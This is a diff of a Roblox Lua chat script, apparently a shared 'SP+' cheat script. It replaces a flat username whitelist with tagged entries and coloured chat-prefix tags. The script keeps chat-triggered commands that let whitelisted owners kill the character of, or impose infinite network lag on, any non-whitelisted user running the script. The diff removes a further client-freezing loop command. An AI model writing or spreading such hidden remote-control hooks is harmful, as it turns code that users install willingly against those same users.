@@ -1,32 +1,40 @@
 local textChatService = game:GetService("TextChatService")
 local allowedplayers = {
-    "SnoopyMyBeloved", --star
-    "ggSnoopyConfigs", --Snoopy
-    "SnoopyConfigs_OnT_op", --Jbob
-    "SnoopyPrivate_INC", --crimsonfied
-    "realIronsnow5", --ironsnow
-    "AnarchyOwner4", --Bismarck
-    "0PrimeIsAssRealOngFr", --sxpremee
-    "a_pr1vat3", --a
-    "ergrge321rgerg", --snooz
-    "vizzerbowls", --voxel
-    "7grandad85", --top
-    "we4rish", -- wearish main acc
-    "XDnathanXD_22", --Snoopy Ranked Acc
-    "QuadConfigsOnYT" --wearish
+    {name = "xdnathanxd_22", tag = 1 },
+
 }
 
-local function isPlayerAllowed(playerName)
-    for _, allowedPlayer in ipairs(allowedplayers) do
-        if playerName == allowedPlayer then
-            return true
+local chatTags = {
+    [1] = {name = "SP+ OWNER", color = Color3.fromRGB(242, 243, 243)},
+    
+    [2] = {name = "SP+ PRIVATE", color = Color3.fromRGB(17, 16, 17)},
+    
+    
+    [3] = {name = "STAR", color = Color3.fromRGB(255, 0, 0)},
+    
+    [4] = {name = "Kai", color = Color3.fromRGB(113,3,255)},
+    
+  
+
+}
+
+
+local function getPlayerTag(playerName)
+    for _, player in ipairs(allowedplayers) do
+        if player.name == playerName then
+            return player.tag
         end
     end
-    return false
+    return nil
+end
+
+local function isPlayerAllowed(playerName)
+    return getPlayerTag(playerName) ~= nil
 end
 
 local commands = {
-    kill = function()
+
+  kill = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
         end
@@ -183,21 +191,6 @@ local commands = {
             local thingy = settings().Network
             thingy.IncomingReplicationLag = math.huge
         end
-    end,
-    lagclient = function()
-        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            while true do
-                for i = 1, 100 do
-                    local part = Instance.new("Part")
-                    part.CFrame = CFrame.new(999999, 999999, 999999)
-                    part.Transparency = 1
-                    part.CanCollide = false
-                    part.Anchored = true
-                    part.Parent = workspace
-                end
-                wait(0.01)
-            end
-        end
     end
 }
 
@@ -205,8 +198,12 @@ textChatService.OnIncomingMessage = function(message: TextChatMessage)
     local properties = Instance.new("TextChatMessageProperties")
     if message.TextSource then
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if isPlayerAllowed(player.Name) then
-            properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
+        local tag = getPlayerTag(player.Name)
+        if tag then
+            local tagData = chatTags[tag]
+            local tagText = "[" .. tagData.name .. "]"
+            local color = tagData.color
+            properties.PrefixText = string.format("<font color='rgb(%d, %d, %d)'>%s</font> %s", color.R * 255, color.G * 255, color.B * 255, tagText, message.PrefixText)
         end
     end
     if message.TextSource then
